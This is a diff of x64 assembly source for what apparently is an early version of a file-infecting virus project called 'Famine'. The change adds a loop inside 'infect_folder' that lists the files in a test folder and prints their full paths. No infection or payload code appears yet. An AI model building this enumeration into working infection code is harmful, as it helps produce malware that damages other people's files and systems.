@@ -14,9 +14,10 @@ extrn exit:proc
 extrn _open:proc
 extrn printf:proc
 extrn FindFirstFileA:proc
+extrn FindNextFileA:proc
 extrn memset:proc
-
-
+extrn strncat:proc
+extrn strncpy:proc
 
 .code
 label_debut:
@@ -25,9 +26,12 @@ db 'Famine version 1.0 (c)oded by magouin-jcamhi',0ah,0h
 hello db 'Hello 64-bit world!',0ah,0
 print_decimal db 'open : %d',0ah,0
 print_ptr db 'ptr : %p',0ah,0
-TMP_1 db 'C:\Users\moi\AppData\Local\Temp\test',0h
+TMP_1 db 'C:\Users\moi\AppData\Local\Temp\test\*',0h
+TMP_1_NAME db 'C:\Users\moi\AppData\Local\Temp\test\',0h
+
 
 ; rbp
+; 400-528	: path + file name
 ; 40-400	: structure WIN32_FIND_DATA dirent
 ; 32-40		: folder_name
 ; 00-32		: shadow
@@ -36,7 +40,7 @@ TMP_1 db 'C:\Users\moi\AppData\Local\Temp\test',0h
 infect_folder proc ; parametres : char *folder_name
 		push rbp
 		mov rbp, rsp
-		sub	rsp, 400
+		sub	rsp, 528
 
 		mov [rsp + 32], rcx
 		call puts
@@ -45,12 +49,35 @@ infect_folder proc ; parametres : char *folder_name
 		lea rdx, [rsp + 40]
 		call FindFirstFileA
 
-		;mov rcx, rsp
-		;add rcx, 40
-		;mov rdx, 0
-		;mov r8, 612
-		;call memset
+		mov rsi, rax
+loop_start:
+		mov rcx, rsi
+		lea rdx, [rsp + 40]
+		call FindNextFileA
 
+		cmp rax, 0
+		je loop_end
+
+		lea rcx, [rsp + 84]
+		call puts
+
+		lea rcx, [rsp + 400]
+		lea rdx, TMP_1_NAME
+		mov r8, 128
+		call strncpy
+
+		lea rcx, [rsp + 400]
+		lea rdx, [rsp + 84]
+		mov r8, 128
+		call strncat
+
+
+
+		lea rcx, [rsp + 400]
+		call puts
+
+		jmp loop_start
+loop_end:
 		xor rax, rax
 		mov rsp, rbp
 		pop rbp
